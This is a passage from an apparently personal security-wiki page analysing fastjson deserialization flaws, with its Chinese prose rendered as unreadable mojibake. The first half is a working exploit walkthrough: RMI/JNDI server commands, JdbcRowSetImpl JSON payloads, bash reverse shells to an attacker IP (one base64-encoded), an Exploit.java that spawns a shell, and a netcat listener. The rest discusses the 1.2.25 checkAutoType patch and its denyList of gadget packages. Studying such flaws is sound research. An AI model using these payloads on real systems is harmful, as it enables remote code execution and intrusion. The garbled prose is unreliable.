x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">mbechler/marshalsec (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></blockquote><p>â€</p><p><strong>ã€å¯åŠ¨ RMI serverã€‘</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-jar</span> .<span class="token punctuation">\</span>jndi_tool.jar

<span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-cp</span> jndi_tool.jar jndi.HRMIServer  æ”»å‡»æœº<span class="token punctuation">(</span>æœåŠ¡å™¨<span class="token punctuation">)</span>_IP ç«¯å£ <span class="token string">&quot;è¦æ‰§è¡Œçš„å‘½ä»¤&quot;</span>

<span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-cp</span> jndi_tool.jar jndi.HRMIServer  <span class="token number">192.168</span>.111.129 <span class="token number">9999</span> <span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}&quot;</span>
Picked up JAVA_TOOL_OPTIONS: <span class="token parameter variable">-Dfile.encoding</span><span class="token operator">=</span>UTF-8
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> payload:  <span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Object&quot;</span>,<span class="token string">&quot;autoCommit&quot;</span>:true<span class="token punctuation">}</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> payload:  <span class="token punctuation">{</span><span class="token string">&quot;e&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;java.lang.Class&quot;</span>,<span class="token string">&quot;val&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">}</span>,<span class="token string">&quot;f&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Object&quot;</span>,<span class="token string">&quot;autoCommit&quot;</span>:true<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Opening JRMP listener on <span class="token number">9999</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>æ³¨ï¼š</strong> å¦‚æœæ˜¯åå¼¹ shell çš„å‘½ä»¤ï¼Œéœ€è¦å°†å…¶è¿›è¡Œç¼–ç ã€‚ç®¡é“ç¬¦ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘ï¼Œåªæœ‰åœ¨ bash ç¯å¢ƒä¸‹æ‰èƒ½ç”¨ã€‚è€Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ java ä¸ºæˆ‘ä»¬æä¾›çš„å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¸æ”¯æŒç®¡é“ç¬¦ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘ç­‰ï¼Œå› æ­¤éœ€è¦ base64 ç¼–ç ä¸€ä¸‹ã€‚</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>// åå¼¹ shell å‘½ä»¤
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.111.129/6666 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€Evil å­—èŠ‚ç ã€‘</strong></p><p>åˆ©ç”¨ JNDI æ³¨å…¥åŠ è½½è¿œç¨‹ RMI server ä¸Šçš„å­—èŠ‚ç ã€‚</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>//javac Exploit.java
<span class="token function">import</span> java.lang.Runtime<span class="token punctuation">;</span>
<span class="token function">import</span> java.lang.Process<span class="token punctuation">;</span>

public class Exploit <span class="token punctuation">{</span>
    public <span class="token function-name function">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        try<span class="token punctuation">{</span>
            Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash -c <span class="token variable">$@</span>|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.111.129/6666 0&gt;&amp;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>catch<span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e.printStackTrace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        Exploit e <span class="token operator">=</span> new Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>ç¼–è¯‘ï¼š<code>javac Exploit.java</code>â€‹</li><li>åœ¨æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼š<code>nc -lvvp 6666</code>â€‹</li><li>å‘é€ payload</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token punctuation">{</span>
    <span class="token string">&quot;b&quot;</span>:<span class="token punctuation">{</span>
        <span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,
        <span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Exploit&quot;</span>,
        <span class="token string">&quot;autoCommit&quot;</span>:true
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><strong>ã€marshalsecã€‘</strong></p><p>å€ŸåŠ© <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">marshalsec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> é¡¹ç›®å¯åŠ¨ä¸€ä¸ª rmi æœåŠ¡å™¨ï¼Œç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶æŒ‡å®šåŠ è½½è¿œç¨‹ç±» Exploit.classã€‚</p><ul><li><p>ç¼–è¯‘ marshalsecï¼š<code>mvn clean package -DskipTests</code>â€‹</p></li><li><p>å¼€å¯ RMI Serverï¼š<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.111.129:8000/#Exploit&quot; 9999</code>â€‹</p></li><li><p>Exploit.java å¹¶ç¼–è¯‘æ”¾åˆ° RMI Server ä¸Š</p></li><li><p>æ”»å‡»æœºå¼€å¯ 8000ï¼ˆé»˜è®¤ï¼‰ç«¯å£çš„ HTTP æœåŠ¡ï¼Œåœ¨ Exploit.class æ‰€åœ¨ç›®å½•æ‰§è¡Œ</p><ul><li>â€‹<code>python2 -m SimpleHTTPServer port</code>â€‹</li><li>â€‹<code>python3 -m http.server port</code>â€‹</li></ul></li><li><p>æ”»å‡»æœºï¼ˆæœåŠ¡å™¨ï¼‰å¼€å¯ 2333 ç«¯å£ç›‘å¬ï¼Œç­‰å¾…é¶æœºå°† shell é€ä¸Šæ¥</p></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// javac Exploit.java</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.111.129/2333 0&gt;&amp;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_1-2-25-è¡¥ä¸ç»•è¿‡åˆ†æ" tabindex="-1"><a class="header-anchor" href="#_1-2-25-è¡¥ä¸ç»•è¿‡åˆ†æ"><span>1.2.25 è¡¥ä¸ç»•è¿‡åˆ†æ</span></a></h2><h3 id="è°ƒè¯•æŸ¥çœ‹" tabindex="-1"><a class="header-anchor" href="#è°ƒè¯•æŸ¥çœ‹"><span>è°ƒè¯•æŸ¥çœ‹</span></a></h3><p>æŠŠ maven ä¾èµ–æ¢æˆ 1.2.25 å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æŠ¥é”™ï¼Œè°ƒè¯•çœ‹çœ‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418163426-wp7n1k0.1cfbb3c1.png" alt="image" loading="lazy">â€‹</p><p>å‘ç°å°† <code>DefaultJSONParser.parseObject()</code>â€‹ å‡½æ•°ä¸­çš„ <code>TypeUtils.loadClass</code>â€‹ æ›¿æ¢ä¸º <code>checkAutoType()</code>â€‹ å‡½æ•°ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418164449-5w09eoi.131c09e3.png" alt="image" loading="lazy">â€‹</p><p>ç®€å•åœ°è¯´ï¼Œ<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>â€‹ å‡½æ•°å°±æ˜¯ä½¿ç”¨é»‘ç™½åå•çš„æ–¹å¼å¯¹ååºåˆ—åŒ–çš„ç±»å‹ç»§ç»­è¿‡æ»¤ï¼ŒacceptList ä¸ºç™½åå•ï¼ˆé»˜è®¤ä¸ºç©ºï¼Œå¯æ‰‹åŠ¨æ·»åŠ ï¼‰ï¼ŒdenyList ä¸ºé»‘åå•ï¼ˆé»˜è®¤ä¸ä¸ºç©ºï¼‰ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒautoTypeSupport ä¸º Falseï¼Œå³å…ˆè¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œéå† denyListï¼Œå¦‚æœå¼•å…¥çš„åº“ä»¥ denyList ä¸­æŸä¸ª deny å¼€å¤´ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä¸­æ–­è¿è¡Œã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418165007-4a7derb.01ecbefe.png" alt="image" loading="lazy">â€‹</p><p>denyList é»‘åå•ä¸­åˆ—å‡ºäº†å¸¸è§çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ Gadgetsã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>denyList <span class="token operator">=</span> 
 <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">&quot;bsh&quot;</span>
 <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">&quot;com.mchange&quot;</span>
 <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">&quot;com.sun.&quot;</span>
 <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">&quot;java.lang.Thread&quot;</span>
 <span class="token number">4</span> <span class="token operator">=</span> <span class="token string">&quot;java.net.Socket&quot;</span>
 <span class="token number">5</span> <span class="token operator">=</span> <span class="token string">&quot;java.rmi&quot;</span>
 <span class="token number">6</span> <span class="token operator">=</span> <span class="token string">&quot;javax.xml&quot;</span>
 <span class="token number">7</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.bcel&quot;</span>
 <span class="token number">8</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.beanutils&quot;</span>
 <span class="token number">9</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections.Transformer&quot;</span>
 <span class="token number">10</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections.functors&quot;</span>
 <span class="token number">11</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections4.comparators&quot;</span>
 <span class="token number">12</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.fileupload&quot;</span>
 <span class="token number">13</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.myfaces.context.servlet&quot;</span>
 <span class="token number">14</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.tomcat&quot;</span>
 <span class="token number">15</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.wicket.util&quot;</span>
 <span class="token number">16</span> <span class="token operator">=</span> <span class="token string">&quot;org.codehaus.groovy.runtime&quot;</span>
 <span class="token number">17</span> <span class="token operator">=</span> <span class="token string">&quot;org.hibernate&quot;</span>
 <span class="token number">18</span> <span class="token operator">=</span> <span class="token string">&quot;org.jboss&quot;</span>
 <span class="token number">19</span> <span class="token operator">=</span> <span class="token string">&quot;org.mozilla.javascript&quot;</span>
 <span class="token number">20</span> <span class="token operator">=</span> <span class="token string">&quot;org.python.core&quot;</span>
 <span class="token number">21</span> <span class="token operator">=</span> <span class="token string">&quot;org.springframework&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="autotypesupport" tabindex="-1"><a class="header-anchor" href="#autotypesupport"><span>AutoTypeSupport</span></a></h3><p>autoTypeSupport æ˜¯ <code>checkAutoType()</code>â€‹ å‡½æ•°å‡ºç°å ParserConfig.java ä¸­æ–°å¢çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œåœ¨ checkAutoType() å‡½æ•°çš„æŸäº›ä»£ç é€»è¾‘èµ·åˆ°å¼€å…³çš„ä½œç”¨ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ autoTypeSupport ä¸º Falseï¼Œå°†å…¶è®¾ç½®ä¸º True æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>JVM å¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeSupport=true</code>â€‹</li><li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>â€‹ï¼Œå¦‚æœæœ‰ä½¿ç”¨éå…¨å±€ ParserConfig åˆ™ç”¨å¦å¤–è°ƒç”¨ <code>setAutoTypeSupport(true);</code>â€‹</li></ul><p>AutoType ç™½åå•è®¾ç½®æ–¹æ³•ï¼š</p><ol><li>JVM å¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code>â€‹</li><li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code>â€‹</li><li>é€šè¿‡ fastjson.properties æ–‡ä»¶é…ç½®ã€‚åœ¨ <code>1.2.25/1.2.26</code>â€‹ ç‰ˆæœ¬æ”¯æŒé€šè¿‡ç±»è·¯å¾„çš„ fastjson.properties æ–‡ä»¶æ¥é…ç½®ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code>â€‹â€‹</li></ol><p>æ¥ä¸‹æ¥åˆ†æå¯¹å„ä¸ªè¡¥ä¸ç‰ˆæœ¬çš„ <code>checkAutoType()</code>â€‹ é»‘åå•ç»•è¿‡ã€‚</p><p>â€</p><p>å¾…ç»­......</p><h2 id="å‰äººæ ½æ ‘" tabindex="-1"><a class="header-anchor" href="#å‰äººæ ½æ ‘"><span>å‰äººæ ½æ ‘</span></a></h2><ul><li><a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener noreferrer">Fastjson ç³»åˆ—ä¸€â€”â€”ååºåˆ—åŒ–æ¼æ´åŸºæœ¬åŸç† [ Mi1k7ea ]<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC" target="_blank" rel="noopener noreferrer">Fastjson ç³»åˆ—äºŒâ€”â€”1.2.22-1.2.24 ååºåˆ—åŒ–æ¼æ´ [ Mi1k7ea ]<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener noreferrer">Fastjson ååºåˆ—åŒ–æ¼æ´åŸºç¡€ Â· BlBana&#39;s BlackHouse<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" target="_blank" rel="noopener noreferrer">Java å®‰å…¨ä¹‹ Fastjson ååºåˆ—åŒ–æ¼æ´åˆ†æ - nice_0e3 - åšå®¢å›­ (cnblogs.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/" target="_blank" rel="noopener noreferrer">Fastjson è¿œç¨‹ååºåˆ—åŒ–ç¨‹åºéªŒè¯çš„æ„é€ å’Œåˆ†æ â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ (nsfocus.net)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></div><!--[--><!----><!--]--><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a href="https://github.com/zha0cai/edit/main/src/codereview/ã€JavaSecã€‘æ¼æ´åˆ†æ/fastjson ååºåˆ—åŒ– (â… ).md" rel="noopener noreferrer" target="_blank" aria-label="åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ" class="nav-link vp-meta-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-meta-item git-info"><!----><!----></div></footer><!----><div id="vp-comment" class="giscus-wrapper input-top" style="display:block;"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" preserveAspectRatio="xMidYMid" viewBox="0 0 100 100"><circle cx="28" cy="75" r="11" fill="currentColor"><animate attributeName="fill-opacity" begin="0s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></circle><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 47a28 28 0 0 1 28 28"><animate attributeName="stroke-opacity" begin="0.1s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 25a50 50 0 0 1 50 50"><animate attributeName="stroke-opacity" begin="0.2s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path></svg></div><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Create by zha0cai</div><div class="vp-copyright">Copyright Â© 2024 Mr.zha0cai </div></footer></div><!--]--><!--[--><!----><!--]--><!--]--></div>
    <script src="/SecWikiPublic/secwiki/assets/js/runtime~app.6d43d119.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/335.fdc5cea6.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/app.9848b62a.js" defer></script>
  </body>
</html>
